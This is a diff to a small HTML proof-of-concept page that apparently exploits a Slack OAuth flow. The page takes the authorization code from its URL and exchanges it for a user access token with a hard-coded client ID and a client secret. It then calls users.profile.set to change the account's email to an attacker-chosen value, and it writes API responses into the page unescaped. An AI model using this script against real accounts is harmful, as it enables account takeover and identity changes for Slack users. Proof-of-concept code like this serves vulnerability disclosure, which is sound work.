@@ -4,6 +4,8 @@
     <title>POC</title>
 </head>
 <body>
+    <input type="email" placeholder="Enter your email" id="email" />
+    <input type="button" onclick="changeEmail()" />
 </body>
 <script>
 
@@ -15,21 +17,25 @@ var id = "1021671975639.1832067875859";
 var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
 var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
 
-var fetchemail = (token) => {
+var fetchemail = (token, email) => {
     var d = 'token='+token;
-    fetch("https://slack.com/api/users.profile.set?profile=%7B%22first_name%22%3A%22test%22%7D",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:d}).then(
+    fetch("https://slack.com/api/users.profile.set?profile=%7B%22email%22%3A%22"+email+"%22%7D",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:d}).then(
         response => response.json()).then((json) => {
             document.write("<pre>Your current email: "+json["profile"]["email"]);
-            document.write("<br />You are changing to: "+json["email_pending"]+"</pre>");
+            document.write("<br />Your new email: "+json["email_pending"]+"</pre>");
+            document.write("<br/><br /><pre>Please check <b>"+json["email_pending"]+"</b> for confirmation link</pre>")
         })
 }
 
-fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
-    response => response.json()
-).then((json) => {
-    console.log(json);
-    fetchemail(json["authed_user"]["access_token"]);
-});
+var changeEmail = () => {
+    fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+        response => response.json()
+    ).then((json) => {
+        console.log(json);
+        var email = document.getElementById("email").value;
+        fetchemail(json["authed_user"]["access_token"], email);
+    });
+}
 
 
 </script>
